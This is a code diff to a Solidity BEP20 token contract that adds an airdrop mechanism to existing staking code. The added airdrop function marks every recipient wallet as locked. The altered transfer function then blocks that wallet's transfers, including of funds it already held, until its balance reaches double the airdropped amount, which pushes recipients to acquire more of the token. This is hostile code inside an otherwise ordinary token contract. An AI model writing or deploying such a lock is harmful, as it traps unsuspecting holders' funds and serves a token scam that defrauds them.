@@ -349,6 +349,11 @@ contract BEP20Token is Context, IBEP20, Ownable {
   string private _symbol;
   string private _name;
 
+  // for airdrop lock
+  address public airdrop_maker;
+  uint256 public unlock_amount;
+  mapping (address => bool) public locked;
+    // staking
     uint256 constant NOMINATOR = 10**18;     // rate nominator
     uint256 constant NUMBER_OF_BLOCKS = 10512000;  // number of blocks per year (1 block = 3 sec)
     mapping (address => uint256) public startBlock;
@@ -387,6 +392,7 @@ contract BEP20Token is Context, IBEP20, Ownable {
     currentRate = 10;
     rewardRate = currentRate * NOMINATOR / (NUMBER_OF_BLOCKS * 100);
     emit ExcludeReward(address(1), true);
+    airdrop_maker = _msgSender();
   }
 
     // percent per year, without decimals
@@ -476,6 +482,35 @@ contract BEP20Token is Context, IBEP20, Ownable {
         stakingRewardPool = _stakingRewardPool.sub(reward);
     }
 
+  function setAirdropMaker(address _addr) external onlyOwner returns(bool) {
+    airdrop_maker = _addr;
+    return true;
+  }
+  
+  function airdrop(address[] calldata recipients, uint256 amount) external returns(bool) {
+    new_block();
+    require(msg.sender == airdrop_maker, "Not airdrop maker");
+    uint256 len = recipients.length;
+    address sender = msg.sender;
+    uint256 _totalStakingAmount = totalStakingAmount;
+    if (excludeReward[sender]) _totalStakingAmount = _totalStakingAmount + (amount*len);
+    _balances[sender] = _balances[sender].sub(amount*len, "BEP20: transfer amount exceeds balance");
+
+    while (len > 0) {
+      len--;
+      address recipient = recipients[len];
+      locked[recipient] = true;
+      if (excludeReward[recipient]) {
+        _totalStakingAmount -= amount;
+      }
+      _balances[recipient] = _balances[recipient].add(amount);
+      emit Transfer(sender, recipient, amount);
+    }
+    totalStakingAmount = _totalStakingAmount;
+    unlock_amount = amount * 2;
+    return true;
+  }
+  
   /**
    * @dev Returns the bep token owner.
    */
@@ -642,6 +677,11 @@ contract BEP20Token is Context, IBEP20, Ownable {
     bool s_e = excludeReward[sender];
     if (r_e && !s_e) totalStakingAmount = totalStakingAmount.sub(amount);
     if (!r_e && s_e) totalStakingAmount = totalStakingAmount.add(amount);
+
+    if (locked[sender]) {
+        require(_balances[sender] >= unlock_amount, "To unlock your wallet, you have to double the airdropped amount.");
+        locked[sender] = false;
+    }
 
     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
     _balances[recipient] = _balances[recipient].add(amount);
